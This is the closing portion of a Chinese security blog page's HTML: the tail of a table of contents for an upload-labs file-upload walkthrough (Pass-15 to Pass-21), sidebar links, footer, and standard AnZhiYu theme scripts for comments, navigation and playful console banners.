toc-level-3"><a class="toc-link" href="#Pass-15-%E5%9B%BE%E7%89%87%F0%9F%90%8E"><span class="toc-text">Pass-15 图片🐎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-16-%E5%9B%BE%E7%89%87%F0%9F%90%8E"><span class="toc-text">Pass-16 图片🐎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-17-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-text">Pass-17 二次渲染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-18-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-text">Pass-18 条件竞争</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-19-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E4%B9%8B%E9%87%8D%E5%91%BD%E5%90%8D%E7%AB%9E%E4%BA%89"><span class="toc-text">Pass-19 条件竞争之重命名竞争</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-20"><span class="toc-text">Pass-20 &#x2F;.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-21"><span class="toc-text">Pass-21</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/wallhaven-5dg579.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件上传漏洞"/></a><div class="content"><a class="title" href="/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞">文件上传漏洞</a><time datetime="2024-10-28T03:32:06.000Z" title="发表于 2024-10-28 11:32:06">2024-10-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/21/%E5%A6%82%E4%BD%95%E5%86%99%E4%B8%80%E7%AF%87%E5%90%88%E6%A0%BC%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A/" title="如何写一篇合格的漏洞报告"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/wallhaven-4doy2l.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="如何写一篇合格的漏洞报告"/></a><div class="content"><a class="title" href="/2024/10/21/%E5%A6%82%E4%BD%95%E5%86%99%E4%B8%80%E7%AF%87%E5%90%88%E6%A0%BC%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A/" title="如何写一篇合格的漏洞报告">如何写一篇合格的漏洞报告</a><time datetime="2024-10-21T07:01:28.000Z" title="发表于 2024-10-21 15:01:28">2024-10-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/19/XSS%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" title="XSS 跨站脚本攻击"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/shouanren.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS 跨站脚本攻击"/></a><div class="content"><a class="title" href="/2024/10/19/XSS%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" title="XSS 跨站脚本攻击">XSS 跨站脚本攻击</a><time datetime="2024-10-19T09:35:59.000Z" title="发表于 2024-10-19 17:35:59">2024-10-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/17/%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/" title="博客教程"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/nvjianshi.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="博客教程"/></a><div class="content"><a class="title" href="/2024/10/17/%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/" title="博客教程">博客教程</a><time datetime="2024-10-16T19:56:45.000Z" title="发表于 2024-10-17 03:56:45">2024-10-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/16/%E6%B5%8B%E8%AF%95/" title="测试"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/shaonv.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="测试"/></a><div class="content"><a class="title" href="/2024/10/16/%E6%B5%8B%E8%AF%95/" title="测试">测试</a><time datetime="2024-10-16T13:43:48.000Z" title="发表于 2024-10-16 21:43:48">2024-10-16</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" href="mailto:shalom86012@gmail.com" title="email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a><img class="footer_mini_logo" title="返回顶部" alt="返回顶部" onclick="anzhiyu.scrollToDest(0, 500)" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shalom86012.eu.org/imgs/Shalom.webp" size="50px"/><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/pluviophile8" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div><div id="workboard"><div id="runtimeTextTip"></div></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo" title="博客框架为Hexo"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title="本站项目由Github托管"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Source-Github.svg" alt="本站项目由Github托管"/></a><a class="github-badge" target="_blank" href="https://www.cloudflare.com/" style="margin-inline:5px" data-title="本站使用Cloudflare为静态资源提供CDN加速" title="本站使用Cloudflare为静态资源提供CDN加速"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shields.io/badge/%E2%98%81%EF%B8%8FCDN-Cloudflare-f4822f" alt="本站使用Cloudflare为静态资源提供CDN加速"/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站使用Vercel托管评论系统" title="本站使用Vercel托管评论系统"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img.shields.io/badge/%E2%98%81%EF%B8%8FCDN-Vercel-ffffff" alt="本站使用Vercel托管评论系统"/></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2024 By <a class="footer-bar-link" href="/" title="Shalom" target="_blank">Shalom</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">3</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/XSS/" style="font-size: 0.88rem;">XSS<sup>1</sup></a><a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">web安全<sup>2</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/" style="font-size: 0.88rem;">博客教程<sup>1</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 0.88rem;">文件上传<sup>1</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A/" style="font-size: 0.88rem;">漏洞报告<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">网络安全<sup>3</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("10/16/2024 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2024 By 安知鱼 V1.6.14",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Shalom 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
+  var grt = new Date("10/16/2024 00:00:00"); //设置网站上线时间
+  var now = new Date();
+  var dnum;
+  var hnum;
+  var mnum;
+  var snum;
+  var nowHour;
+
+  // 计算并更新天数、小时数、分钟数和秒数
+  function updateTime() {
+    now = new Date(); // 更新 now 的值
+    nowHour = now.getHours(); // 更新 nowHour 的值
+    var days = (now - grt) / 1000 / 60 / 60 / 24;
+    dnum = Math.floor(days);
+    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
+    hnum = Math.floor(hours);
+    if (String(hnum).length == 1) {
+      hnum = "0" + hnum;
+    }
+    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
+    mnum = Math.floor(minutes);
+    if (String(mnum).length == 1) {
+      mnum = "0" + mnum;
+    }
+    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
+    snum = Math.round(seconds);
+    if (String(snum).length == 1) {
+      snum = "0" + snum;
+    }
+  }
+
+  // 更新网页中显示的网站运行时间
+  function updateHtml() {
+    const footer = document.getElementById("footer");
+    if (!footer) return
+    let currentTimeHtml = "";
+    if (nowHour < 18 && nowHour >= 9) {
+      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
+      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
+    } else {
+      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
+      let img = document.querySelector("#workboard .workSituationImg");
+      if (img != null) {
+        img.src = "";
+        img.title = "";
+        img.alt = "";
+      }
+
+      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
+    }
+
+    if (document.getElementById("runtimeTextTip")) {
+      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
+    }
+  }
+
+  setInterval(() => {
+    updateTime();
+    updateHtml();
+  }, 1000);
+})();</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikoo-vercel.shalom86014.eu.org/',
+      region: '',
+      onCommentLoaded: () => {
+        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(runFn,0)
+    else getScript('https://cdn.cbd.int/twikoo@1.6.39/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo-vercel.shalom86014.eu.org/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const runFn = () => {
+    init();
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else {
+      loadTwikoo()
+    }
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getComment = () => {
+    const runTwikoo = () => {
+      twikoo.getRecentComments({
+        envId: 'https://twikoo-vercel.shalom86014.eu.org/',
+        region: '',
+        pageSize: 6,
+        includeReply: true
+      }).then(function (res) {
+        const twikooArray = res.map(e => {
+          return {
+            'content': changeContent(e.comment),
+            'avatar': e.avatar,
+            'nick': e.nick,
+            'url': e.url + '#' + e.id,
+            'date': new Date(e.created).toISOString()
+          }
+        })
+
+        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
+        generateHtml(twikooArray)
+      }).catch(function (err) {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
+      })
+    }
+
+    if (typeof twikoo === 'object') {
+      runTwikoo()
+    } else {
+      getScript('https://cdn.cbd.int/twikoo@1.6.39/dist/twikoo.all.min.js').then(runTwikoo)
+    }
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
+        }
+        
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom && ($dom.innerHTML= result)
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('twikoo-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: true,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', 'G-TECSCZ4DMP', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
